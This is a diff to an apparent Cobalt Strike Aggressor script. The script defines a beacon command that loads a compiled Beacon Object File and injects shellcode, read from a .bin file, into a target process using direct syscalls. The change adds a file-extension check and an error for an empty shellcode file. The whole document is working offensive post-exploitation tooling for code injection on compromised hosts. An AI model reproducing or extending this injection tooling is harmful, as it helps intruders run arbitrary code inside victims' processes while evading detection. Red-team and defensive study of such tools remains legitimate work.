@@ -5,24 +5,44 @@
 # x86_64-w64-mingw32-gcc -c syscall_stcinject.c -o syscall_stcinject.o -masm=intel
 
 alias syscall_stc_shinject {
-	local('$handle $data $args $sc_data');
+	local('$handle $data $args $sc_data $filename $extension');
 	
 	# read in the right BOF file
 	$handle = openf(script_resource("syscall_stcinject.o"));
 	$data = readb($handle, -1);
 	closef($handle);
 
-	$sc_handle = openf($3);
-	$sc_data = readb($sc_handle, -1);
-	closef($sc_handle);
-
-	# pack our arguments
-	$args = bof_pack($1, "ib", $2, $sc_data);
+	($filename, $extension) = split('\.', $3);
 	
-	btask($1, "Reading shellcode from: $+  $3");
+	if ($extension ismatch "bin")
+	{
+		$sc_handle = openf($3);
+		$sc_data = readb($sc_handle, -1);
+		closef($sc_handle);
+		if(strlen($sc_data) == 0)
+		{
+			berror($1, "Could not open bin file");
+		}
+		else
+		{
 
-	# execute it.
-	beacon_inline_execute($1, $data, "go", $args);
+			# pack our arguments
+			$args = bof_pack($1, "ib", $2, $sc_data);
+	
+			btask($1, "Reading shellcode from: $+  $3");
+
+			# execute it.
+			beacon_inline_execute($1, $data, "go", $args);
+		}
+	}
+	else
+	{
+		berror($1, "Need to use a *.bin file");
+	}
+	
+
+	
+
 }
 
 alias syscall_stcinject {
